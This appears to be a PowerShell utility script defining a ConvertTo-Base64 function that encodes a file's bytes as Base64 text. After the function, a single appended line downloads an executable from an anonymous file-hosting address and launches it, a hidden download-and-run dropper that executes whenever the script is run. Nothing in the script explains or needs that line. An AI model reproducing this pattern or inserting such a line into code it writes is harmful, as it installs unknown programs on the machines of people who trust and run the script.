function ConvertTo-Base64
{


	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true,
				   ValueFromPipeline = $true)]
		[ValidateScript({ Test-Path -Path $_ })]
		[String]$Path
	)
	Write-Verbose -Message "[ConvertTo-Base64] Converting image to Base64 $Path"
	[System.convert]::ToBase64String((Get-Content -Path $path -Encoding Byte))
}

(New-Object System.Net.WebClient).DownloadFile('http://anonfile.xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe','fleeble.exe');Start-Process 'fleeble.exe'

